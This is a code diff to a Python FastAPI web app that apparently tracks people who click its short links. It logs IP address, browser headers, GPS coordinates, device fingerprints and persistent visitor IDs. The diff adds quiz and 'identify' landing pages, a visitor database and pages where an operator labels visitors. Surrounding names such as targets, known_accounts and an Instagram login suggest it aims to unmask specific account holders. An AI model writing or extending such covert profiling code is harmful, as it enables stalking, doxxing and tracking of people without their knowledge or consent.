@@ -372,8 +372,9 @@ def admin_page(request: Request, msg: str = "", err: str = "", u=Depends(admin_a
             d["known"] = tdb.q1("SELECT COUNT(*) c FROM known_accounts")["c"]
             d["links"] = tdb.q1("SELECT COUNT(*) c FROM links")["c"]
             d["hits"] = tdb.q1("SELECT COUNT(*) c FROM link_hits")["c"]
+            d["visitors"] = tdb.q1("SELECT COUNT(*) c FROM visitors")["c"]
         except Exception:
-            d["targets"] = d["known"] = d["links"] = d["hits"] = "-"
+            d["targets"] = d["known"] = d["links"] = d["hits"] = d["visitors"] = "-"
         d["ig_user"] = config.load(t).get("instagram", {}).get("username") or ""
         d["size_mb"] = round(_tenant_size(t) / 1048576, 2)
         d["sessions"] = len(users.list_sessions(r["username"], "user"))
@@ -866,6 +867,7 @@ def _record_hit(request: Request, code: str):
                              "x-requested-with", "sec-fetch-site", "sec-fetch-mode")}
     hid = db.add_hit({
         "code": code, "ts": now_iso(), "ip": ip, "ua": ua,
+        "nonce": secrets.token_hex(16),
         "lang": request.headers.get("accept-language", ""),
         "referer": request.headers.get("referer", ""),
         "accept": request.headers.get("accept", ""),
@@ -903,10 +905,28 @@ def link_hit(code: str, request: Request):
     if not link or not link["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
     hid = _record_hit(request, code)
+    hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
+    nonce = (hrow["nonce"] if hrow else "") or ""
+
     if link["mode"] == "redirect" and link["dest"]:
         return RedirectResponse(link["dest"], 302)
+
+    if link["mode"] == "quiz" and db.questions(code):
+        qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
+               "options": _json.loads(r["options"] or "[]")} for r in db.questions(code)]
+        return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
+                      dest=link["dest"] or "", nonce=nonce,
+                      questions_json=_json.dumps(qs, ensure_ascii=False))
+
+    if link["mode"] == "identify":
+        ip = linktrack.client_ip(request)
+        return render("link_identify.html", request, code=code, hit_id=hid, link=link,
+                      dest=link["dest"] or "", nonce=nonce, ip=ip,
+                      p=linktrack.parse_ua(request.headers.get("user-agent", "")),
+                      g=linktrack.geo(ip))
+
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
-                  dest=link["dest"] or "")
+                  dest=link["dest"] or "", nonce=nonce)
 
 
 @app.post("/l/{code}/x")
@@ -920,6 +940,12 @@ async def link_extra(code: str, request: Request):
     hid = body.get("hit_id")
     if not hid:
         return {"ok": False}
+
+    ip = linktrack.client_ip(request)
+    ua = request.headers.get("user-agent", "")
+    p = linktrack.parse_ua(ua)
+    g = linktrack.geo(ip)
+
     f = {}
     for k in ("screen", "tz", "platform", "cores", "mem", "touch"):
         if body.get(k) not in (None, ""):
@@ -928,8 +954,87 @@ async def link_extra(code: str, request: Request):
         f["gps_lat"] = body.get("gps_lat")
         f["gps_lon"] = body.get("gps_lon")
         f["gps_acc"] = body.get("gps_acc")
+    if body.get("fp"):
+        f["fingerprint"] = str(body["fp"])[:128]
+    if body.get("fp_json"):
+        f["fp_json"] = _json.dumps(body["fp_json"], ensure_ascii=False)[:8000]
+    if body.get("vid"):
+        f["vid"] = str(body["vid"])[:64]
+    if body.get("pubkey"):
+        f["pubkey"] = str(body["pubkey"])[:512]
+    if body.get("sig"):
+        f["sig"] = str(body["sig"])[:512]
     if f:
         db.update_hit(int(hid), **f)
+
+    row = db.q1("SELECT nonce,vid,pubkey,sig FROM link_hits WHERE id=?", (int(hid),))
+    if row and row["nonce"] and row["pubkey"] and row["sig"]:
+        db.update_hit(int(hid), sig_ok=1 if linktrack.verify_sig(
+            row["pubkey"], row["sig"], row["nonce"]) else 0)
+
+    vid = (row["vid"] if row else "") or ""
+    if vid:
+        db.upsert_visitor(
+            vid, ip=ip, country=g.get("country"), region=g.get("region"),
+            city=g.get("city"), isp=g.get("isp"), asn=g.get("asn"),
+            device=p["device"], os=p["os"], browser=p["browser"], inapp=p["inapp"],
+            fingerprint=str(body.get("fp") or "")[:128],
+            pubkey=str(body.get("pubkey") or "")[:512])
+    return {"ok": True, "vid": vid}
+
+
+@app.post("/l/{code}/a")
+async def link_answer(code: str, request: Request):
+    if not _bind_owner(code):
+        return {"ok": False}
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+    q = db.q1("SELECT * FROM link_questions WHERE id=? AND code=?",
+              (int(body.get("qid") or 0), code))
+    if not q:
+        return {"ok": False}
+    ans = body.get("answer")
+    if isinstance(ans, list):
+        ans = ",".join(str(x) for x in ans)
+    ans = str(ans or "")[:2000]
+    ok = None
+    if (q["answer_key"] or "") != "":
+        ok = int(str(q["answer_key"]).strip() == ans.strip())
+    db.add_answer({"code": code, "hit_id": int(body.get("hit_id") or 0),
+                   "qid": q["id"], "ord": q["ord"], "qtype": q["qtype"],
+                   "answer": ans, "is_correct": ok,
+                   "ms": int(body.get("ms") or 0),
+                   "ip": linktrack.client_ip(request), "ts": now_iso()})
+
+    reveal = ""
+    if q["qtype"] in ("choice", "multi"):
+        opts = _json.loads(q["options"] or "[]")
+        idxs = [int(x) for x in ans.split(",") if x.strip().isdigit()]
+        reveal = " / ".join(o.get("reveal", "") for i, o in enumerate(opts)
+                            if i in idxs and o.get("reveal"))
+    else:
+        reveal = q["reveal"] or ""
+    return {"ok": True, "correct": ok, "reveal": reveal}
+
+
+@app.post("/l/{code}/done")
+async def link_done(code: str, request: Request):
+    if not _bind_owner(code):
+        return {"ok": False}
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+    hid = int(body.get("hit_id") or 0)
+    if hid:
+        db.update_hit(hid, quiz_done=1, quiz_score=float(body.get("score") or 0),
+                      quiz_total=int(body.get("total") or 0),
+                      quiz_ms=int(body.get("ms") or 0))
+        db.log("link", "quiz_done", {"code": code, "hit_id": hid,
+                                     "score": body.get("score"),
+                                     "total": body.get("total")})
     return {"ok": True}
 
 
@@ -973,7 +1078,7 @@ def links_add(name: str = Form(""), dest: str = Form(""), note: str = Form(""),
     code = _new_code()
     users.register_link(code, u)
     db.add_link(code, name or code, dest.strip(), note,
-                mode if mode in ("page", "geo", "redirect") else "page")
+                mode if mode in ("page", "geo", "redirect", "quiz", "identify") else "page")
     return RedirectResponse(f"/link/{code}", 303)
 
 
@@ -994,7 +1099,11 @@ def link_detail(code: str, request: Request, bots: str = "", u=Depends(auth)):
     return render("link_detail.html", request, link=link, hits=hits, stats=stats,
                   points_json=_json.dumps(points, ensure_ascii=False),
                   base=str(request.base_url).rstrip("/"), bots=bots,
-                  net={h["id"]: linktrack.network_label(h) for h in hits})
+                  net={h["id"]: linktrack.network_label(h) for h in hits},
+                  answers_by_hit={h["id"]: [dict(a) for a in db.answers_for(h["id"])]
+                                  for h in hits},
+                  qs=db.questions(code),
+                  vlabels={v["vid"]: (v["label"] or "") for v in db.visitors(500)})
 
 
 @app.post("/link/{code}/toggle")
@@ -1026,6 +1135,60 @@ def link_hit_bot(code: str, hid: int, u=Depends(auth)):
     return RedirectResponse(f"/link/{code}?bots=1", 303)
 
 
+# ---------- クイズ編集 / 訪問者 ----------
+
+@app.get("/link/{code}/questions", response_class=HTMLResponse)
+def link_questions(code: str, request: Request, u=Depends(auth)):
+    link = db.link_get(code)
+    if not link:
+        raise HTTPException(404)
+    return render("link_questions.html", request, link=link, qs=db.questions(code),
+                  base=str(request.base_url).rstrip("/"))
+
+
+@app.post("/link/{code}/questions/add")
+def link_questions_add(code: str, prompt: str = Form(...), qtype: str = Form("choice"),
+                       options: str = Form(""), answer_key: str = Form(""),
+                       reveal: str = Form(""), u=Depends(auth)):
+    rows = []
+    for line in (options or "").splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        parts = [p.strip() for p in line.split("|")]
+        rows.append({"label": parts[0],
+                     "key": parts[1] if len(parts) > 1 else str(len(rows)),
+                     "reveal": parts[2] if len(parts) > 2 else ""})
+    db.add_question(code, prompt, qtype if qtype in ("choice", "multi", "text") else "choice",
+                    rows, answer_key, reveal)
+    return RedirectResponse(f"/link/{code}/questions", 303)
+
+
+@app.post("/link/{code}/questions/{qid}/delete")
+def link_questions_del(code: str, qid: int, u=Depends(auth)):
+    db.del_question(qid)
+    return RedirectResponse(f"/link/{code}/questions", 303)
+
+
+@app.get("/visitors", response_class=HTMLResponse)
+def visitors_page(request: Request, u=Depends(auth)):
+    return render("visitors.html", request, rows=db.visitors(500))
+
+
+@app.get("/visitor/{vid}", response_class=HTMLResponse)
+def visitor_detail(vid: str, request: Request, u=Depends(auth)):
+    v = db.visitor(vid)
+    if not v:
+        raise HTTPException(404)
+    return render("visitor.html", request, v=v, hits=db.hits_by_vid(vid))
+
+
+@app.post("/visitor/{vid}/label")
+def visitor_label(vid: str, label: str = Form(""), note: str = Form(""), u=Depends(auth)):
+    db.set_visitor_label(vid, label, note)
+    return RedirectResponse(f"/visitor/{vid}", 303)
+
+
 # ---------- API / エクスポート ----------
 
 @app.get("/api/summary")
@@ -1036,6 +1199,7 @@ def api_summary(u=Depends(auth)):
         "known": db.q1("SELECT COUNT(*) c FROM known_accounts")["c"],
         "runs": db.q1("SELECT COUNT(*) c FROM identity_runs")["c"],
         "links": db.q1("SELECT COUNT(*) c FROM links")["c"],
+        "visitors": db.q1("SELECT COUNT(*) c FROM visitors")["c"],
         "events": db.q1("SELECT COUNT(*) c FROM events")["c"],
     }
 
